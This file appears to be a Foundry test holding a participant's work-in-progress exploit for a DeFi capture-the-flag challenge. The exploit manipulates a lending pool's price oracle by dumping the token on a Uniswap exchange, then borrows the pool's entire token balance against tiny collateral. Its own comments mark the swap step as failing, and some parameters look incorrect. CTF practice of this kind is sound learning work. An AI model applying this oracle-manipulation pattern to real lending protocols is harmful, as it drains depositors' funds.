pragma solidity >0.8.0;

import "./utils/OvercollateralizedV2Fixture.sol";

contract OvercollateralizedV2Test is OvercollateralizedV2Fixture {

    function setUp() public override {
        super.setUp();
    }

    function test_overcollateralized_v2() public {

        // Start acting as the attacker for the remainder of the exploit
        vm.startPrank(attacker);

        /**
         * Code your exploit here
         */
        /*
            ---- We have to steal all the funds ----
            We have the _getOracleQuote function that get the balances from the official libraries
            Coulnd't we do the same as in the overcollateralized CTF?
            Dump the price of the DefiCtf so the collateral required in WETH downs a lot and then just leave the collateral there?
        */

        // Step 1: Swap all of our DefiCtfToken tokens for ETH on the Uniswap v1 exchange.
        // First we approve the exchange to get our tokens 
        // -1 in order to pass the assertGt(token.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE). If not it will be assertEq
        token.approve(exchange, ATTACKER_INITIAL_TOKEN_BALANCE - 1);
        // Then we swap our tokens for WETH
        // swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        (bool success, bytes memory data) = exchange.call(abi.encodeWithSignature( // TO-DO: Fails -> Success false
            "swapExactTokensForETH(uint,uint,address[],address,uint)",
            ATTACKER_INITIAL_TOKEN_BALANCE - 1,
            1, // Matters?
            [address(token), address(weth)],
            msg.sender,
            999 // Matters?
        ));
        require(success, "swapExactTokensForETH failed");

        // Step 2: We calculate the collateral
        (, data) = pool.call(abi.encodeWithSignature("calculateDepositOfWETHRequired(uint256)", POOL_INITIAL_TOKEN_BALANCE));
        uint256 collateral = abi.decode(data, (uint256));

        // Step 3: We borrow all the DefiCtfToken on the pool, since the price it's so cheap we won't return it
        // First we have to approve the pool to use our tokens
        weth.approve(pool, collateral);
        (bool success_2, ) = pool.call{value: collateral}(abi.encodeWithSignature("borrow(uint256)", POOL_INITIAL_TOKEN_BALANCE));
        require(success_2, "borrow failed");

        // Stop acting as the attacker
        vm.stopPrank();
        // Perform exploit validations
        _assertions();
    }

    function _assertions() internal {
        // The lending pool has no tokens left.
        assertEq(token.balanceOf(pool), 0);
        // The attacker has all the tokens.
        assertGe(token.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
    }
}